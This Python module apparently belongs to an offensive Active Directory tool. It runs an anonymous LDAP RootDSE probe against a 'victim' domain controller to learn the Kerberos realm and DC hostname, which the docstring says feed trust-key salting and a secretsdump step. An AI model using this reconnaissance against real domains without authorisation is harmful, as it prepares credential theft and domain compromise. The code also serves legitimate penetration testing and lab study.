"""Anonymous victim recon (no credentials) for aorta-dc.

One null-session probe: anonymous LDAP RootDSE -> DNS domain (Kerberos
realm, needed for the trust-key salt) + DC FQDN (seeds the secretsdump
hint).  If even this is refused, pass --victim-realm/--victim-dc instead.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass

log = logging.getLogger("enum")

LDAP_TIMEOUT = 5


@dataclass
class VictimInfo:
    ip: str
    realm: str | None = None  # DNS domain, lower-case (e.g. victim.local)
    dc_fqdn: str | None = None  # lower-case

    @property
    def missing(self) -> list[str]:
        return [f for f in ("realm", "dc_fqdn") if getattr(self, f) is None]


def domain_from_naming_context(nc: str) -> str:
    """Convert ``DC=victim,DC=local`` to ``victim.local`` or return an empty string."""
    parts = (part.strip() for part in nc.split(","))
    labels = [part[3:] for part in parts if part.lower().startswith("dc=") and len(part) > 3]
    return ".".join(labels).lower()


def root_dse(ip: str, timeout: int = LDAP_TIMEOUT) -> tuple[str | None, str | None]:
    """Anonymous RootDSE -> (dc_fqdn, dns_domain); (None, None) on failure."""
    try:
        import ldap3

        srv = ldap3.Server(ip, get_info=ldap3.NONE, connect_timeout=timeout)
        conn = ldap3.Connection(srv, authentication=ldap3.ANONYMOUS, auto_bind=True, receive_timeout=timeout)
        try:
            conn.search(
                "",
                "(objectClass=*)",
                search_scope=ldap3.BASE,
                attributes=["dnsHostName", "rootDomainNamingContext"],
            )
            if not conn.entries:
                return None, None
            entry = conn.entries[0]
            fqdn = str(entry["dnsHostName"]) if "dnsHostName" in entry else None
            nc = str(entry["rootDomainNamingContext"]) if "rootDomainNamingContext" in entry else ""
        finally:
            conn.unbind()
        return (fqdn.lower().rstrip(".") if fqdn else None), domain_from_naming_context(nc) or None
    except Exception as exc:  # noqa: BLE001 - probe must never crash the run
        log.info("anonymous RootDSE against %s failed: %s", ip, exc)
        return None, None


def enumerate_victim(ip: str) -> VictimInfo:
    """Run the RootDSE probe and return whatever came back.

    The probe swallows its own errors; the guard here makes a raising probe a
    missing field instead of a crash.
    """
    info = VictimInfo(ip=ip)

    try:
        fqdn, domain = root_dse(ip)
    except Exception as exc:  # noqa: BLE001
        log.info("RootDSE probe raised: %s", exc)
        fqdn = domain = None
    if fqdn:
        info.dc_fqdn = fqdn
    if domain:
        info.realm = domain

    if info.realm is None:
        log.error(
            "could not determine the victim DNS domain from %s (anonymous RootDSE failed or was refused)",
            ip,
        )
    return info
